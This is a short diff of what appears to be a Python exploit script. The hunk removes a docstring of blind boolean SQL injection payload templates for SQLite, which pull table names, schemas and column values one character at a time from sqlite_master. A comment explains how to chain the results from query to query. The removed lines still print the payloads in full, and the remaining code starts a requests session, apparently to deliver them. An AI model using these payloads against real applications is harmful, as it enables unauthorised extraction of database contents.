@@ -1,16 +1,3 @@
-'''
-For retrieving table names:
-' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {} --
-
-For retrieving table schema:
-' or UNICODE(SUBSTR((SELECT sql FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} --
-
-For retrieving values inside columns:
-' or UNICODE(SUBSTR((SELECT $COLUMN_NAME FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} --
-
-Replace $TABLE_NAME and $COLUMN_NAME with data that you retrieved from privious query.
-'''
-
 import requests
 
 s = requests.Session()
